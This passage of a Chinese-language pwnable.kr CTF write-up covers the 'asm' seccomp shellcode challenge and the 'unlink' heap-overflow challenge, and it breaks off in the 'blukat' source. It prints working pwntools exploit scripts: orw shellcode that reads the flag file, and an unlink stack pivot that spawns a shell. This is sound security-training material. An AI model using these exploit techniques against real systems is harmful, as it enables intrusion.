class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sandbox</span><span class="params">()</span></span>&#123;</span><br><span class="line">scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line"><span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;seccomp error\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">seccomp_release(ctx);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;seccomp error\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> stub[] = <span class="string">&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line">setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Welcome to shellcoding practice challenge.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;If this does not challenge you. you should play &#x27;asg&#x27; challenge :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* sh = (<span class="keyword">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;give me your x64 shellcode: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">alarm(<span class="number">10</span>);</span><br><span class="line">chroot(<span class="string">&quot;/home/asm_pwn&quot;</span>);<span class="comment">// you are in chroot jail. so you can&#x27;t use symlink in /tmp</span></span><br><span class="line">sandbox();</span><br><span class="line">((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))sh)();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是一个orw沙箱，只能用open，read和write系统写一段shellcode读flag，但是flag文件名特别长<code>this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong</code>，而且还会强制在shellcode之前加入一段stub清空rip和rsp以外的所有寄存器。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x41414000:xor    rax,rax</span><br><span class="line">0x41414003:xor    rbx,rbx</span><br><span class="line">0x41414006:xor    rcx,rcx</span><br><span class="line">0x41414009:xor    rdx,rdx</span><br><span class="line">0x4141400c:xor    rsi,rsi</span><br><span class="line">0x4141400f:xor    rdi,rdi</span><br><span class="line">0x41414012:xor    rbp,rbp</span><br><span class="line">0x41414015:xor    r8,r8</span><br><span class="line">0x41414018:xor    r9,r9</span><br><span class="line">0x4141401b:xor    r10,r10</span><br><span class="line">0x4141401e:xor    r11,r11</span><br><span class="line">0x41414021:xor    r12,r12</span><br><span class="line">0x41414024:xor    r13,r13</span><br><span class="line">0x41414027:xor    r14,r14</span><br><span class="line">0x4141402a:xor    r15,r15</span><br></pre></td></tr></table></figure><p>首先esp没被清空，所以我们可以用栈保存flag的文件名，然后用open系统调用拿到文件的fd，之后用read通过fd读取flag到栈上，最后用write系统调用把栈上的flag打印出来，最终的exp如下。最开始的<code>push rax</code>是为了截断栈上的flag文件名，之后利用rax和push将flag文件名放到栈里，需要注意的是在mov立即数的时候，若立即数长度小于64位，应该mov到对应长度的寄存器里，否则会出现坏字符，例如<code>mov rax,0x1</code>，这样shellcode就会出现<code>\x00</code>，应该使用<code>mov al,0x1</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9026</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./asm&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># int open(const char * pathname, int flags, mode_t mode);</span></span><br><span class="line"><span class="comment"># #define O_RDONLY 00000000</span></span><br><span class="line"><span class="comment"># fd = open(&quot;/hom e/or w/// flag&quot;, O_RDONLY)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssize_t read(int fd, void * buf, size_t count);</span></span><br><span class="line"><span class="comment"># read(fd, buf, 20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssize_t write (int fd, const void * buf, size_t count);</span></span><br><span class="line"><span class="comment"># write(1, buf, 20)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;.////////this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#x27;</span>[::<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line">LEN = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> len(flag) % LEN == <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">flags = [f.encode(<span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> f <span class="keyword">in</span> (flag[i:i+LEN] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(flag), LEN))]</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">%s;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,0x2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov dil,al;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,0x50;</span></span><br><span class="line"><span class="string">mov rdx,rax;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov dil,0x1;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rdx,rax;</span></span><br><span class="line"><span class="string">mov al,0x1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (<span class="string">&#x27;;\n&#x27;</span>.join(((<span class="string">&#x27;mov rax,0x%s;\npush rax&#x27;</span> % f) <span class="keyword">for</span> f <span class="keyword">in</span> flags))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="string">&#x27;\x00&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode</span><br><span class="line"><span class="keyword">assert</span> len(shellcode) &lt;= <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">conn.sendafter(<span class="string">&#x27;give me your x64 shellcode: &#x27;</span>, shellcode)</span><br><span class="line">log.success(<span class="string">&#x27;Get flag: &#x27;</span> + conn.recvline())</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="unlink-10-pt"><a href="#unlink-10-pt" class="headerlink" title="unlink (10 pt)"></a>unlink (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">fd</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tagOBJ</span>* <span class="title">bk</span>;</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">&#125;OBJ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlink</span><span class="params">(OBJ* P)</span></span>&#123;</span><br><span class="line">OBJ* BK;</span><br><span class="line">OBJ* FD;</span><br><span class="line">BK=P-&gt;bk;</span><br><span class="line">FD=P-&gt;fd;</span><br><span class="line">FD-&gt;bk=BK;</span><br><span class="line">BK-&gt;fd=FD;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">OBJ* A = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* B = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line">OBJ* C = (OBJ*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(OBJ));</span><br><span class="line"></span><br><span class="line"><span class="comment">// double linked list: A &lt;-&gt; B &lt;-&gt; C</span></span><br><span class="line">A-&gt;fd = B;</span><br><span class="line">B-&gt;bk = A;</span><br><span class="line">B-&gt;fd = C;</span><br><span class="line">C-&gt;bk = B;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;here is stack address leak: %p\n&quot;</span>, &amp;A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;here is heap address leak: %p\n&quot;</span>, A);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;now that you have leaks, get shell!\n&quot;</span>);</span><br><span class="line"><span class="comment">// heap overflow!</span></span><br><span class="line">gets(A-&gt;buf);</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploit this unlink!</span></span><br><span class="line">unlink(B);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最简单的一个unlink漏洞，该给的都给了，甚至连栈上和堆上的地址都给了，和malloc的unlink相比也没有任何的安全检查。unlink的最基本原理就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd = p-&gt;fd;</span><br><span class="line">bk = p-&gt;bk;</span><br><span class="line">fd-&gt;bk = bk;</span><br><span class="line">bk-&gt;fd = fd;</span><br></pre></td></tr></table></figure><p>如果我们可以控制p的fd和bk，就可以实现任意地址写，其中fd为某个地址，bk为我们要写入的值，如下所示，其中a和b需要可写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;fd = a;</span><br><span class="line">p-&gt;bk = b;</span><br><span class="line"></span><br><span class="line">fd = p-&gt;fd = a;</span><br><span class="line">bk = p-&gt;bk = b;</span><br><span class="line"></span><br><span class="line">fd-&gt;bk = *(fd + <span class="number">4</span>) = *(a + <span class="number">4</span>) = bk = b;</span><br><span class="line">bk-&gt;fd = *(bk + <span class="number">0</span>) = *b = fd = a;</span><br></pre></td></tr></table></figure><p>题目最开始malloc了1024的chunk，然后malloc了3个OBJ：A，B和C，组成了一个双向链表，A的buf有一个堆溢出，最后unlink B触发unlink漏洞。由于B在A的后面malloc，所以B在A的物理高地址相邻，通过A可以修改B的fd和bk。我们的最终目的是在main函数结束ret的时候跳转到shell的地址，那么就需要控制栈顶esp的值，而在main的最后有一个ecx，如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x080485f2 &lt;+195&gt;:call   0x8048504 &lt;unlink&gt;</span><br><span class="line">0x080485f7 &lt;+200&gt;:add    esp,0x10</span><br><span class="line">0x080485fa &lt;+203&gt;:mov    eax,0x0</span><br><span class="line">0x080485ff &lt;+208&gt;:mov    ecx,DWORD PTR [ebp-0x4]</span><br><span class="line">0x08048602 &lt;+211&gt;:leave</span><br><span class="line">0x08048603 &lt;+212&gt;:lea    esp,[ecx-0x4]</span><br><span class="line">0x08048606 &lt;+215&gt;:ret</span><br></pre></td></tr></table></figure><p>首先把ebp-4的值放到ecx里，然后用leave缩减栈，最后在ret前有一个lea可以把ecx-4的值写入esp，那么如果我们可以控制ebp-4的值，那么就可以控制ecx，最后就可以控制esp了，ebp是固定的，通过提供的栈地址很容易可以算出ebp-4的位置位于提供的栈地址+16处。我们可以将shell地址写到堆上，然后通过unlink写入到ebp-4，最后通过lea将shell地址写入esp，ret的时候就可以控制eip跳转到shell地址了，通过查看堆上内容，可以算出我们写入的shell偏移为提供的堆地址+8处（+8是因为要跳过A的fd和bk），最后由于ecx在lea前还减了4，我们要再补上4。还有需要注意的是malloc出的chunk的里的buf大小为8字节，除去我们输入的4字节的shell地址，还有4字节的junk需要填充，之后还需要填充B的chunk的prev_size和size一共8个字节，然后就可以覆盖B的fd和bk。最终的exp如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9026</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># context.clear(arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;/home/unlink/unlink&quot;</span>)</span><br><span class="line"><span class="comment"># pg = cyclic_gen()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">shell_addr = <span class="number">0x080484eb</span></span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;here is stack address leak: &#x27;</span>)</span><br><span class="line">stack_addr = int(conn.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Get stack address: %s&#x27;</span> % hex(stack_addr))</span><br><span class="line"></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;here is heap address leak: &#x27;</span>)</span><br><span class="line">heap_addr = int(conn.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;Get heap address: %s&#x27;</span> % hex(heap_addr))</span><br><span class="line"></span><br><span class="line">fd = heap_addr + <span class="number">8</span> + <span class="number">4</span></span><br><span class="line">bk = stack_addr + <span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;now that you have leaks, get shell!\n&#x27;</span>, p32(shell_addr) +  <span class="string">&#x27;a&#x27;</span> * (<span class="number">8</span> - <span class="number">4</span> + <span class="number">4</span> + <span class="number">4</span>) + p32(fd) + p32(bk))</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="blukat-3-pt"><a href="#blukat-3-pt" class="headerlink" title="blukat (3 pt)"></a>blukat (3 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span> password[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">char</span>* key = <span class="string">&quot;3\rG[S/%\x1c\x1d#0?\rIS\x0f\x1c\x1d\x18;,4\x1b\x00\x1bp;5\x0b\x1b\x08\x45+&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calc_flag</span><span class="params">(<span class="keyword">char</span>* s)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(s); i++)&#123;</span><br><span class="line">flag[i] = s[i] ^ key[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">FILE* fp = fopen(<span class="string">&quot;/home/blukat/password&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">fgets(password, <span class="number">100</span>, fp);</span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;guess the password!\n&quot;</span>);</span><br><span class="line">fgets(buf, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(password, buf))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;congrats! here is your flag: &quot;</span>);</span><br><span 